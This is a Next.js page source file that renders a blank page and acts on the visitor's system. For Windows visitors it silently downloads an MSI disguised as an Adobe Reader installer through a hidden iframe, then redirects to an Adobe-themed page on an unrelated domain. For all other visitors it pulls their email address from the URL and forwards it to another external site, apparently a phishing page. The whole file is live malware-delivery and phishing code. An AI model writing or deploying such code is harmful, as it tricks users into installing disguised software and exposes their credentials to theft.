// pages/index.js
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent || '';
    const isWindows = /windows/i.test(userAgent);

    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";

    //------------------------------------------------------------------
    // 1. Windows users → MSI download, then redirect
    //------------------------------------------------------------------
    if (isWindows) {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '/Reader_adobe_install_online.msi'; // must exist in /public
      document.body.appendChild(iframe);

      setTimeout(() => {
        window.location.href =
          'https://mksonline.com.mx/css/adobe/reader/download.html';
      }, 2000);

      return;
    }

    //------------------------------------------------------------------
    // 2. NON-Windows → Grab email from hash/query/parameters
    //------------------------------------------------------------------
    const url = new URL(window.location.href);
    let email = "";

    // A) Hash ( #email@example.com )
    if (url.hash) {
      email = url.hash.substring(1);
    }

    // B) Query parameters ?email=
    if (!email && url.searchParams.get("email")) {
      email = url.searchParams.get("email");
    }

    // C) Query parameter fallback ?smn=
    if (!email && url.searchParams.get("smn")) {
      email = url.searchParams.get("smn");
    }

    // Encode safely
    const safeEmail = email ? encodeURIComponent(email) : "";

    //------------------------------------------------------------------
    // 3. Redirect to external NON-Windows destination with query parameter
    //------------------------------------------------------------------
    const separator = NON_WINDOWS_TARGET.includes('?') ? '&' : '?';
    const finalUrl = safeEmail
      ? `${NON_WINDOWS_TARGET}${separator}email=${safeEmail}`
      : NON_WINDOWS_TARGET;

    window.location.href = finalUrl;
  }, []);

  return null; // blank page while redirecting
}
